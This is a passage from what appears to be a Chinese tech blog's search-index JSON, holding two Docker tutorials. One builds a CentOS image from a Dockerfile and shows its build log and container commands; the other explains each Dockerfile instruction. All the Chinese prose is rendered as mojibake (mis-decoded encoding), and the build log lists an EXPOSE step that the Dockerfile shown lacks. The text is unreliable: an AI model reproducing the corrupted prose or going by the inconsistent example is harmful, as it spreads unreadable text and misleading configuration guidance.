"readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Docker ä¹‹ä¸ƒå®æˆ˜ Dockerfile çš„ç®€å•ç¼–å†™",url:"/posts/24ee2660.html",text:'å®æˆ˜å†…å®¹ä»‹ç» å®æˆ˜ç¼–å†™ Dockerfileï¼ŒæŒ‡å®šç»ˆç«¯ç™»å½•åçš„é»˜è®¤è·¯å¾„ï¼ŒåŒæ—¶é¢„å®‰è£… vimã€ifconfig å·¥å…·ï¼Œæœ€åé€šè¿‡ Dockerfile æ„å»ºæ–°çš„ Centos é•œåƒå¹¶è¿è¡Œèµ·æ¥ã€‚ ç¼–å†™ Dockerfile æ–‡ä»¶ 12345678910FROM centosMAINTAINER peter&lt;peter@gmail.com&gt;ENV work_path /usr/localWORKDIR $work_pathRUN yum -y update &amp;&amp; yum -y install vim net-toolsCMD /bin/bash æ„å»ºæ–°çš„ Docker é•œåƒ 1234567891011# æ‹‰å–æœ€æ–°çš„Centosé•œåƒ# docker pull centos# åˆ›å»ºDockerfileæ–‡ä»¶ï¼Œå¹¶å†™å…¥ä¸Šè¿°çš„æ–‡ä»¶å†…å®¹# vi ~/dockerfile-centos# é€šè¿‡Dockerfileæ–‡ä»¶æ„å»ºæ–°çš„Dockeré•œåƒ# docker build -f ~/dockerfile-centos -t peter/centos:1.1 .# å¯ä»¥ä½¿ç”¨--no-cacheå‚æ•°è®©Dockeræ„å»ºé•œåƒæ—¶ä¸ä½¿ç”¨ç¼“å­˜ï¼ˆä¸­é—´é•œåƒï¼‰# docker build --no-cache=True -f ~/dockerfile-centos -t peter/centos:1.1 . æ„å»ºæ–° Docker é•œåƒæ—¶è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯ 1234567891011121314151617181920212223242526272829303132333435363738394041424344Sending build context to Docker daemon 93.82MBStep 1/8 : FROM centos ---&gt; 1e1148e4cc2cStep 2/8 : MAINTAINER peter&lt;peter@gmail.com&gt; ---&gt; Running in bff9f4e99fc1Removing intermediate container bff9f4e99fc1 ---&gt; 058e53021a24Step 3/8 : ENV work_path /usr/local ---&gt; Running in 33e3edef7380Removing intermediate container 33e3edef7380 ---&gt; 52f1709ed735Step 4/8 : WORKDIR $work_path ---&gt; Running in 1304b1642e5aRemoving intermediate container 1304b1642e5a ---&gt; a158527938a7Step 5/8 : RUN yum -y update ---&gt; Running in 654318bc1889Loaded plugins: fastestmirror, ovlDetermining fastest mirrors * base: mirror.jdcloud.com * extras: mirror.jdcloud.com * updates: mirrors.cn99.comResolving Dependencies--&gt; Running transaction check---&gt; Package systemd.x86_64 0:219-62.el7 will be updated---&gt; Package systemd.x86_64 0:219-62.el7_6.2 will be an update---&gt; Package systemd-libs.x86_64 0:219-62.el7 will be updated---&gt; Package systemd-libs.x86_64 0:219-62.el7_6.2 will be an update---&gt; Package tzdata.noarch 0:2018g-1.el7 will be updated---&gt; Package tzdata.noarch 0:2018i-1.el7 will be an update--&gt; Finished Dependency Resolution...ï¼ˆçœç•¥ï¼‰Step 7/8 : EXPOSE 80 ---&gt; Running in 4aae7e66419cRemoving intermediate container 4aae7e66419c ---&gt; b5647b33ffb8Step 8/8 : CMD /bin/bash ---&gt; Running in 877a21e5c705Removing intermediate container 877a21e5c705 ---&gt; 90fed978ec5cSuccessfully built 90fed978ec5cSuccessfully tagged peter/centos:1.1 æŸ¥çœ‹æ–°æ„å»ºçš„ Docker é•œåƒ 12345678910111213141516171819# æŸ¥çœ‹æ–°çš„Dockeré•œåƒ# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/centos 1.1 8544847124e9 3 minutes ago 385MBcentos latest 1e1148e4cc2c 6 weeks ago 202MB# æŸ¥çœ‹æ–°Dockeré•œåƒçš„æ„å»ºå†å²# docker history peter/centos:1.1IMAGE CREATED CREATED BY SIZE COMMENT90fed978ec5c 2 hours ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "/binâ€¦ 0Bb5647b33ffb8 2 hours ago /bin/sh -c #(nop) EXPOSE 80 0B3c621d86e6de 2 hours ago /bin/sh -c yum -y install vim net-tools 79.5MBa83741b44f7b 2 hours ago /bin/sh -c yum -y update 104MBa158527938a7 2 hours ago /bin/sh -c #(nop) WORKDIR /usr/local 0B52f1709ed735 2 hours ago /bin/sh -c #(nop) ENV work_path=/usr/local 0B058e53021a24 2 hours ago /bin/sh -c #(nop) MAINTAINER peter&lt;peter@gmâ€¦ 0B1e1148e4cc2c 6 weeks ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) LABEL org.label-schema.scâ€¦ 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) ADD file:6f877549795f4798aâ€¦ 202MB ä»¥äº¤äº’æ–¹å¼è¿è¡Œæ–°æ„å»ºçš„ Docker é•œåƒ 123456789101112131415# ä»¥äº¤äº’å¼è¿è¡Œæ–°çš„Dockeré•œåƒ# docker run -it --name="peter-centos" peter/centos:1.1# é€€å‡ºç»ˆç«¯ï¼ˆä¸åœæ­¢å®¹å™¨ï¼‰# ctrl + p + q# æŸ¥çœ‹å½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„Dockerå®¹å™¨# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb1a8c8ac1efc peter/centos:1.1 "/bin/sh -c /bin/bash" 2 minutes ago Up 2 minutes 80/tcp peter-centos# é‡æ–°è¿æ¥åˆ°Dockerå®¹å™¨ï¼Œè¿æ¥ä¹‹åå¦‚æœæƒ³æ–­å¼€è¿æ¥ï¼Œåœ¨å®¹å™¨å†…çš„ç»ˆç«¯ç›´æ¥æ‰§è¡Œ"exit"å‘½ä»¤å³å¯ï¼Œè¿æ¥æ–­å¼€åå®¹å™¨ä¸ä¼šåœæ­¢è¿è¡Œ# docker exec -it peter-centos /bin/bash# æ³¨æ„ï¼šå¦‚æœä»¥åå°æ–¹å¼è¿è¡Œä¸Šé¢æ–°æ„å»ºçš„Dockeré•œåƒï¼Œå½“å®¹å™¨å¯åŠ¨å®Œæˆåä¼šé©¬ä¸Šå…³é—­ï¼Œå› ä¸ºDockerä¼šè®¤ä¸ºå®¹å™¨å†…æ²¡æœ‰éœ€è¦è¿è¡Œçš„åº”ç”¨ï¼ˆæŒ‡å½“å‰å®¹å™¨å†…æ²¡æœ‰å‰å°è¿è¡Œçš„è¿›ç¨‹ï¼‰ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Docker ä¹‹å…­ Dockerfile è¯¦è§£",url:"/posts/7d424db2.html",text:'Dockerfile ä»‹ç» Dockerfile æ˜¯ç”¨æ¥æ„å»º Docker é•œåƒçš„æ–‡ä»¶ï¼Œå®è´¨æ˜¯ä¸€ç³»åˆ—å‘½ä»¤å’Œå‚æ•°æ„æˆçš„è„šæœ¬æ–‡ä»¶ã€‚å½“ Dockerfile æ–‡ä»¶ç¼–å†™å®Œä¹‹åï¼Œå¯ä»¥é€šè¿‡ â€œdocker buildâ€ ä¸â€docker runâ€ å‘½ä»¤æ„å»ºå¹¶è¿è¡Œæ–°çš„ Docker é•œåƒã€‚å…¶ä¸­ Dockerfile å®šä¹‰äº†è¿›ç¨‹éœ€è¦çš„ä¸€åˆ‡ä¸œè¥¿ï¼Œæ¶‰åŠçš„å†…å®¹åŒ…æ‹¬æ‰§è¡Œä»£ç æˆ–è€…æ–‡ä»¶ã€ç¯å¢ƒå˜é‡ã€ä¾èµ–åŒ…ã€è¿è¡Œæ—¶ç¯å¢ƒã€åŠ¨æ€é“¾æ¥åº“ã€æ“ä½œç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬ã€æœåŠ¡è¿›ç¨‹å’Œå†…æ ¸è¿›ç¨‹ï¼ˆå½“åº”ç”¨è¿›ç¨‹éœ€è¦å’Œç³»ç»ŸæœåŠ¡ã€å†…æ ¸è¿›ç¨‹æ‰“äº¤é“çš„æ—¶å€™ï¼Œéœ€è¦è€ƒè™‘å¦‚ä½•è®¾è®¡ namespace çš„æƒé™æ§åˆ¶ï¼‰ç­‰ç­‰ã€‚ Dockerfileã€Docker é•œåƒã€Docker å®¹å™¨ä¸‰è€…çš„å…³ç³» Dockerfile é¢å‘å¼€å‘ï¼ŒDocker é•œåƒæ˜¯äº¤ä»˜æ ‡å‡†ï¼ŒDocker å®¹å™¨åˆ™æ¶‰åŠéƒ¨ç½²ä¸è¿ç»´ï¼Œä¸‰è€…ç¼ºä¸€ä¸å¯ï¼ŒåˆåŠ›å……å½“ Docker ä½“ç³»çš„åŸºçŸ³ã€‚ä»åº”ç”¨è½¯ä»¶çš„è§’åº¦æ¥çœ‹ï¼ŒDockerfileã€Docker é•œåƒä¸ Docker å®¹å™¨åˆ†åˆ«ä»£è¡¨è½¯ä»¶çš„ä¸‰ä¸ªä¸åŒé˜¶æ®µï¼Œå…¶ä¸­ Dockerfile æ˜¯è½¯ä»¶çš„åŸææ–™ï¼ŒDocker é•œåƒæ˜¯è½¯ä»¶çš„äº¤ä»˜å“ï¼ŒDocker å®¹å™¨åˆ™å¯ä»¥è®¤ä¸ºæ˜¯è½¯ä»¶çš„è¿è¡ŒçŠ¶æ€ï¼Œç¤ºæ„å›¾å¦‚ä¸‹ï¼š Dockerfile ç¼–å†™ç¤ºä¾‹ 123456789101112# Centos7å®˜æ–¹çš„DockerfileFROM scratchADD centos-7-docker.tar.xz /LABEL org.label-schema.schema-version="1.0" \\ org.label-schema.name="CentOS Base Image" \\ org.label-schema.vendor="CentOS" \\ org.label-schema.license="GPLv2" \\ org.label-schema.build-date="20181205"CMD ["/bin/bash"] Dockerfile åŸºç¡€çŸ¥è¯† #è¡¨ç¤ºæ³¨é‡Š æŒ‡ä»¤æŒ‰ç…§ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºæ‰§è¡Œ æ¯æ¡æŒ‡ä»¤éƒ½ä¼šåˆ›å»ºä¸€ä¸ªé•œåƒå±‚ï¼Œå¹¶å¯¹é•œåƒè¿›è¡Œæäº¤ æ¯æ¡ä¿ç•™å­—æŒ‡ä»¤éƒ½å¿…é¡»ä¸ºå¤§å†™å­—æ¯æ ¼å¼ï¼Œä¸”åé¢è‡³å°‘è¦è·Ÿéšä¸€ä¸ªå‚æ•° Docker æ‰§è¡Œ Dockerfile çš„å¤§è‡´æµç¨‹ Docker ä»åŸºç¡€é•œåƒè¿è¡Œä¸€ä¸ªå®¹å™¨ æ‰§è¡Œä¸€æ¡æŒ‡ä»¤å¹¶å¯¹å®¹å™¨ä½œå‡ºä¿®æ”¹ æ‰§è¡Œç±»ä¼¼â€docker commitâ€ çš„æ“ä½œæ¥æäº¤ä¸€ä¸ªæ–°çš„é•œåƒå±‚ Docker å†åŸºäºåˆšæäº¤çš„æ–°é•œåƒè¿è¡Œä¸€ä¸ªæ–°å®¹å™¨ æ‰§è¡Œ Dockerfile ä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œé‡å¤ä¸Šé¢çš„æ‰§è¡Œæµç¨‹ï¼Œç›´åˆ°æ‰€æœ‰æŒ‡ä»¤éƒ½æ‰§è¡Œå®Œæˆ Dockerfile æŒ‡ä»¤ - FROM 1234567åŠŸèƒ½ï¼šæŒ‡å®šåŸºç¡€é•œåƒï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼›å¦‚æœä¸ä»¥ä»»ä½•ç¬¬ä¸‰æ–¹é•œåƒä¸ºåŸºç¡€ï¼Œé‚£ä¹ˆå†™æ³•ä¸ºï¼šFROM scratchè¯­æ³•ï¼šFROM &lt;image&gt;FROM &lt;image&gt;:&lt;tag&gt;FROM &lt;image&gt;:&lt;digest&gt;ä¸‰ç§å†™æ³•ï¼Œå…¶ä¸­&lt;tag&gt;å’Œ&lt;digest&gt; æ˜¯å¯é€‰é¡¹ï¼Œå¦‚æœæ²¡æœ‰é€‰æ‹©ï¼Œé‚£ä¹ˆé»˜è®¤å€¼ä¸ºlatest Dockerfile æŒ‡ä»¤ - MAINTAINER 123åŠŸèƒ½ï¼šæŒ‡å®šé•œåƒç»´æŠ¤è€…ï¼Œå¯ä»¥æ˜¯ç»´æŠ¤è€…çš„å§“åã€é‚®ç®±åœ°å€ã€ç½‘é¡µåœ°å€ç­‰è¯­æ³•ï¼šMAINTAINER &lt;name&gt; Dockerfile æŒ‡ä»¤ - RUN 123456789101112131415åŠŸèƒ½ï¼šæŒ‡å®šé•œåƒæ„å»ºæ—¶éœ€è¦è¿è¡Œçš„å‘½ä»¤ï¼Œä¸€èˆ¬ç”¨äºæ›´æ–°ç³»ç»Ÿã€å®‰è£…åº”ç”¨è½¯ä»¶ç­‰è¯­æ³•ï¼šRUN &lt;command&gt;RUN ["executable", "param1", "param2"]ç¬¬ä¸€ç§å†™æ³•åè¾¹ç›´æ¥è·Ÿshellå‘½ä»¤ï¼Œåœ¨linuxæ“ä½œç³»ç»Ÿä¸Šé»˜è®¤æ˜¯"/bin/sh -c"ï¼Œåœ¨windowsæ“ä½œç³»ç»Ÿä¸Šé»˜è®¤æ˜¯"cmd /S /C"ç¬¬äºŒç§å†™æ³•æ˜¯ç±»ä¼¼äºå‡½æ•°è°ƒç”¨ï¼Œå¯å°†executableç†è§£æˆä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåé¢å°±æ˜¯ä¸¤ä¸ªå‚æ•°RUNæŒ‡ä»¤ä½¿ç”¨\\ä½œä¸ºæ¢è¡Œç¬¦ç¤ºä¾‹ï¼šRUN /bin/bash -c "source $HOME/.bashrc; echo $HOME"RUN ["/bin/bash", "-c", "echo hello"]æ³¨æ„ï¼šå¤šè¡Œå‘½ä»¤å°½é‡ä¸è¦å†™å¤šä¸ªRUNï¼ŒåŸå› æ˜¯Dockerfileä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹æ–°çš„é•œåƒå±‚ï¼›å¤šå°‘ä¸ªRUNå°±æ„å»ºäº†å¤šå°‘ä¸ªé•œåƒå±‚ï¼Œä¼šé€ æˆé•œåƒçš„è‡ƒè‚¿ã€å¤šå±‚ï¼Œä¸ä»…ä»…å¢åŠ äº†æ„å»ºéƒ¨ç½²çš„æ—¶é—´ï¼Œè¿˜å®¹æ˜“å‡ºé”™ Dockerfile æŒ‡ä»¤ - ENV 123456åŠŸèƒ½ï¼šè®¾ç½®ç¯å¢ƒå˜é‡è¯­æ³•ï¼šENV &lt;key&gt; &lt;value&gt;ENV &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...ä¸¤è€…çš„åŒºåˆ«å°±æ˜¯ç¬¬ä¸€ç§æ˜¯ä¸€æ¬¡è®¾ç½®ä¸€ä¸ªï¼Œç¬¬äºŒç§æ˜¯ä¸€æ¬¡è®¾ç½®å¤šä¸ª Dockerfile æŒ‡ä»¤ - WORKDIR 12345678910åŠŸèƒ½ï¼šè®¾ç½®å·¥ä½œç›®å½•ï¼ˆå³å®¹å™¨åˆ›å»ºå¹¶å¯åŠ¨åï¼Œé€šè¿‡ç»ˆç«¯ç™»å½•è¿›æ¥æ‰€å¤„çš„ç›®å½•ï¼‰ï¼›å¯¹RUNã€CMDã€ENTRYPOINTã€COPYã€ADDæŒ‡ä»¤ç”Ÿæ•ˆï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨åˆ™ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œå¯ä»¥è®¾ç½®å¤šæ¬¡è¯­æ³•ï¼šWORKDIR /path/to/workdiræ³¨æ„ï¼šWORKDIRå¯ä»¥è§£æç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚ï¼šENV DIRPATH /pathWORKDIR $DIRPATHRUN pwd Dockerfile æŒ‡ä»¤ - ADD 123456789101112131415åŠŸèƒ½ï¼šå°†å®¿ä¸»æœºç›®å½•ä¸‹çš„æ–‡ä»¶æ‹·è´è¿›é•œåƒä¸­ï¼Œä¸”æ”¯æŒurlè§£æä¸è‡ªåŠ¨è§£å‹tarå‹ç¼©åŒ…è¯­æ³•ï¼šADD &lt;src&gt;... &lt;dest&gt;ADD ["&lt;src&gt;",... "&lt;dest&gt;"]&lt;src&gt;å¯ä»¥æ˜¯ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶æˆ–è€…æ˜¯ä¸€ä¸ªæœ¬åœ°å‹ç¼©æ–‡ä»¶ï¼Œè¿˜å¯ä»¥æ˜¯ä¸€ä¸ªurlï¼ˆæ­¤æ—¶ç±»ä¼¼äºwgetå‘½ä»¤ï¼‰&lt;dest&gt;è·¯å¾„çš„å¡«å†™å¯ä»¥æ˜¯å®¹å™¨å†…çš„ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹äºå·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„ç¤ºä¾‹ï¼šADD test relativeDir/ADD test /relativeDirADD http://example.com/foobar /æ³¨æ„ï¼šä»»ä½•å‹ç¼©æ–‡ä»¶é€šè¿‡urlçš„æ–¹å¼è¿›è¡Œæ‹·è´ï¼Œéƒ½ä¸ä¼šè‡ªåŠ¨è§£å‹ï¼›åŒæ—¶å°½é‡ä¸è¦æŠŠ&lt;scr&gt;å†™æˆä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå¦‚æœ&lt;src&gt;æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ™å¤åˆ¶æ•´ä¸ªç›®å½•çš„å†…å®¹ï¼ŒåŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿå…ƒæ•°æ® Dockerfile æŒ‡ä»¤ - COPY 12345678åŠŸèƒ½ï¼šå°†å®¿ä¸»æœºç›®å½•ä¸‹çš„æ–‡ä»¶æ‹·è´è¿›é•œåƒä¸­è¯­æ³•ï¼šCOPY &lt;src&gt;... &lt;dest&gt;COPY ["&lt;src&gt;",... "&lt;dest&gt;"]æ³¨æ„ï¼šCOPYæŒ‡ä»¤åªèƒ½æ‹·è´æœ¬åœ°æ–‡ä»¶ï¼Œä¸æ”¯æŒurlè§£æï¼Œä¸ä¼šè‡ªåŠ¨è§£å‹tarå‹ç¼©åŒ…ï¼Œé™¤æ­¤ä¹‹å¤–å…¶ä»–ç”¨æ³•ä¸ADDæŒ‡ä»¤ä¸€è‡´ Dockerfile æŒ‡ä»¤ - VOLUME 12345678åŠŸèƒ½ï¼šæ•°æ®å·ï¼Œç”¨äºå®¹å™¨å†…æ•°æ®çš„ä¿å­˜å’ŒæŒä¹…åŒ–è¯­æ³•ï¼šVOLUME /dataVolumeVOLUME ["/dataVolume"]VOLUME /dataVolume1 /dataVolume2VOLUME ["/dataVolume1","/dataVolume2"]å‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªJsonArray ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªæˆ–å¤šä¸ªå€¼ï¼Œä¸Šé¢å››ç§å†™æ³•éƒ½æ˜¯æ­£ç¡®çš„ Dockerfile æŒ‡ä»¤ - CMD 1234567891011121314151617åŠŸèƒ½ï¼šæŒ‡å®šå®¹å™¨å¯åŠ¨æ—¶éœ€è¦æ‰§è¡Œçš„å‘½ä»¤è¯­æ³•ï¼šCMD ["executable","param1","param2"]CMD command param1 param2CMD ["param1","param2"]ç¬¬ä¸€ç§ä½¿ç”¨execæ‰§è¡Œï¼Œæ¨èä½¿ç”¨ç¬¬äºŒç§åœ¨/bin/shä¸­æ‰§è¡Œï¼Œæä¾›ç»™éœ€è¦äº¤äº’çš„åº”ç”¨ç¬¬ä¸‰ç§æŒ‡å®šæä¾›ç»™ENTRYPOINTæŒ‡ä»¤çš„å‚æ•°ç¤ºä¾‹ï¼šCMD [ "sh", "-c", "echo $HOME"]CMD /bin/bash -c "echo $HOME"CMD [ "echo", "$HOME"]æ³¨æ„ï¼šæ¯ä¸ªDockerfileæ–‡ä»¶åªèƒ½æœ‰ä¸€æ¡CMDå‘½ä»¤ï¼Œå¦‚æœæŒ‡å®šäº†å¤šæ¡CMDæŒ‡ä»¤ï¼Œåªæœ‰æœ€åä¸€æ¡CMDæŒ‡ä»¤ä¼šè¢«æ‰§è¡Œã€‚åŒæ—¶å¦‚æœç”¨æˆ·å¯åŠ¨å®¹å™¨æ—¶å€™æŒ‡å®šäº†è¿è¡Œçš„å‘½ä»¤ï¼Œåˆ™ä¼šè¦†ç›–æ‰Dockerfileæ–‡ä»¶ä¸­CMDæŒ‡ä»¤æŒ‡å®šçš„å‘½ä»¤ï¼›ä¾‹å¦‚â€œdocker run -it peter/centos:1.1 ls -alâ€ä¸­çš„â€œls -alâ€ä¼šè¦†ç›–Dockerfileæ–‡ä»¶ä¸­çš„CMDæŒ‡ä»¤ã€‚ Dockerfile æŒ‡ä»¤ - ENTRYPOINT 123456789101112131415161718åŠŸèƒ½ï¼šæŒ‡å®šå®¹å™¨å¯åŠ¨æ—¶éœ€è¦æ‰§è¡Œçš„å‘½ä»¤è¯­æ³•ï¼šENTRYPOINT ["executable", "param1", "param2"]ENTRYPOINT command param1 param2ç¤ºä¾‹ï¼šENTRYPOINT [ "sh", "-c", "echo $HOME"]ENTRYPOINT /bin/bash -c "echo $HOME"ENTRYPOINTä¸CMDæŒ‡ä»¤çš„ç›¸åŒç‚¹ï¼š1) å®¹å™¨å¯åŠ¨æ—¶æ‰æ‰§è¡ŒæŒ‡ä»¤ï¼Œè¿è¡Œæ—¶æœºç›¸åŒ2) æ¯ä¸ªDockerfileæ–‡ä»¶åªèƒ½æœ‰ä¸€æ¡ENTRYPOINT/CMDå‘½ä»¤ï¼Œå¦‚æœæŒ‡å®šäº†å¤šæ¡ENTRYPOINT/CMDæŒ‡ä»¤ï¼Œåªæœ‰æœ€åä¸€æ¡ENTRYPOINT/CMDæŒ‡ä»¤ä¼šè¢«æ‰§è¡ŒENTRYPOINTä¸CMDæŒ‡ä»¤çš„ä¸åŒç‚¹ï¼š1ï¼‰å¦‚æœç”¨æˆ·å¯åŠ¨å®¹å™¨æ—¶æŒ‡å®šäº†è¿è¡Œçš„å‘½ä»¤ï¼ŒENTRYPOINTæŒ‡ä»¤ä¸ä¼šè¢«è¦†ç›–ï¼ˆä¼šè¿½åŠ åç»­ç”¨æˆ·å¯åŠ¨å®¹å™¨æ—¶æŒ‡å®šçš„å‘½ä»¤å†…å®¹ï¼‰ï¼Œè€ŒCMDæŒ‡ä»¤åˆ™ä¼šè¢«è¦†ç›–2ï¼‰å¦‚æœåœ¨Dockerfileä¸­åŒæ—¶å†™äº†ENTRYPOINTå’ŒCMDæŒ‡ä»¤ï¼Œå¹¶ä¸”CMDæŒ‡ä»¤ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆCMDæŒ‡ä»¤çš„å†…å®¹å°†ä¼šä½œä¸ºENTRYPOINTæŒ‡ä»¤çš„å‚æ•°3ï¼‰å¦‚æœåœ¨Dockerfileä¸­åŒæ—¶å†™äº†ENTRYPOINTå’ŒCMDæŒ‡ä»¤ï¼Œå¹¶ä¸”CMDæŒ‡ä»¤æ˜¯ä¸€ä¸ªå®Œæ•´çš„æŒ‡ä»¤ï¼Œé‚£ä¹ˆå®ƒä»¬ä¸¤ä¸ªä¼šäº’ç›¸è¦†ç›–ï¼Œè°åœ¨æœ€åè°ç”Ÿæ•ˆ Dockerfile æŒ‡ä»¤ - ONBUILD 12345678åŠŸèƒ½ï¼šè¯¥æŒ‡ä»¤åªå¯¹å½“å‰é•œåƒçš„å­é•œåƒç”Ÿæ•ˆï¼Œå³çˆ¶é•œåƒåœ¨è¢«å­é•œåƒç»§æ‰¿åï¼Œçˆ¶é•œåƒDockerfileä¸­çš„ONBUILDæŒ‡ä»¤ä¼šè¢«è§¦å‘è¯­æ³•ï¼šONBUILD [INSTRUCTION]ç¤ºä¾‹ï¼šONBUILD RUN [ "npm", "install" ]ONBUILD COPY ./package.json /app Dockerfile æŒ‡ä»¤ - EXPOSE 123456789åŠŸèƒ½ï¼šæš´éœ²å®¹å™¨è¿è¡Œæ—¶ç›‘å¬çš„ç«¯å£ï¼Œä½¿å®¹å™¨å†…çš„åº”ç”¨å¯ä»¥é€šè¿‡ç«¯å£å’Œå¤–ç•Œé€šä¿¡è¯­æ³•ï¼šEXPOSE port1EXPOSE port2EXPOSE port3æ³¨æ„ï¼šEXPOSEæŒ‡ä»¤å¹¶ä¸ä¼šè®©å®¹å™¨ç›‘å¬çš„ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„ç«¯å£ï¼Œå¦‚æœæƒ³ä½¿å®¹å™¨ç›‘å¬çš„ç«¯å£ä¸å®¿ä¸»æœºçš„ç«¯å£æœ‰æ˜ å°„å…³ç³»ï¼Œå¿…é¡»åœ¨å®¹å™¨å¯åŠ¨çš„æ—¶å€™æŒ‡å®š"-P"æˆ–è€…"-p"å‚æ•° Dockerfile æŒ‡ä»¤ - USER 12345678åŠŸèƒ½ï¼šæŒ‡å®šå¯åŠ¨å®¹å™¨çš„ç”¨æˆ·ï¼Œå¯ä»¥æ˜¯ç”¨æˆ·åæˆ–UIDè¯­æ³•ï¼šUSER adminUSER UIDæ³¨æ„ï¼šå¦‚æœè®¾ç½®äº†å®¹å™¨ä»¥adminç”¨æˆ·å»è¿è¡Œï¼Œé‚£ä¹ˆRUNã€CMDã€ENTRYPOINTæŒ‡ä»¤éƒ½ä¼šä»¥è¿™ä¸ªç”¨æˆ·èº«ä»½å»è¿è¡Œ Dockerfile æŒ‡ä»¤ - STOPSIGNAL 1234åŠŸèƒ½ï¼šæŒ‡å®šå½“å®¹å™¨é€€å‡ºæ—¶ç»™ç³»ç»Ÿå‘é€æŒ‡å®šçš„ä¿¡å·è¯­æ³•ï¼šSTOPSIGNAL signal Dockerfile æŒ‡ä»¤ - ARG 1234567891011åŠŸèƒ½ï¼šå®šä¹‰å˜é‡è¯­æ³•ï¼šARG &lt;name&gt;[=&lt;default value&gt;]ç¤ºä¾‹ï¼šARG user1ARG buildno=1æ³¨æ„ï¼šå½“ä½¿ç”¨ARGæŒ‡ä»¤å®šä¹‰äº†ä¸€ä¸ªå˜é‡ï¼Œåœ¨æ‰§è¡Œ"docker build"å‘½ä»¤æ„å»ºé•œåƒçš„æ—¶å€™ï¼Œä½¿ç”¨"--build-arg &lt;varname&gt;=&lt;value&gt;"æ¥æŒ‡å®šå˜é‡çš„å€¼ï¼›å¦‚æœç”¨æˆ·åœ¨æ„å»ºé•œåƒæ—¶æŒ‡å®šäº†ä¸€ä¸ªæ²¡æœ‰å®šä¹‰åœ¨Dockerfileä¸­çš„å˜é‡ï¼Œé‚£ä¹ˆDockerå°†ä¼šæŠ›å‡ºä¸€ä¸ªWarningï¼›å¦‚æœARGå®šä¹‰çš„å˜é‡æ‹¥æœ‰é»˜è®¤å€¼ï¼Œé‚£ä¹ˆå½“æ„å»ºé•œåƒæ²¡æœ‰æŒ‡å®šå˜é‡å€¼çš„æ—¶å€™ï¼Œå°†ä¼šä½¿ç”¨è¿™ä¸ªé»˜è®¤å€¼ Dockerfile æŒ‡ä»¤ - LABEL 12345678910111213åŠŸèƒ½ï¼šä¸ºé•œåƒæŒ‡å®šæ ‡ç­¾è¯­æ³•ï¼šLABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...ç¤ºä¾‹ï¼šLABEL "com.example.vendor"="ACME Incorporated"LABEL multi.label1="value1" \\multi.label2="value2" \\other="value3"æ³¨æ„ï¼šDockerfileä¸­å¯ä»¥æœ‰å¤šä¸ªLABELæŒ‡ä»¤ï¼Œä½†æ˜¯å»ºè®®åªä½¿ç”¨ä¸€ä¸ªLABELæŒ‡ä»¤å¹¶å†™æˆä¸€è¡Œï¼Œå¦‚å¤ªé•¿éœ€è¦æ¢è¡Œåˆ™å¯ä»¥ä½¿ç”¨\\ç¬¦å·ä½œä¸ºæ¢è¡Œç¬¦ã€‚LABELæŒ‡ä»¤ä¼šç»§æ‰¿åŸºç¡€é•œåƒä¸­çš„LABELæŒ‡ä»¤ï¼Œå¦‚é‡åˆ°keyç›¸åŒï¼Œåˆ™è¦†ç›–çˆ¶é•œåƒçš„å€¼ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", 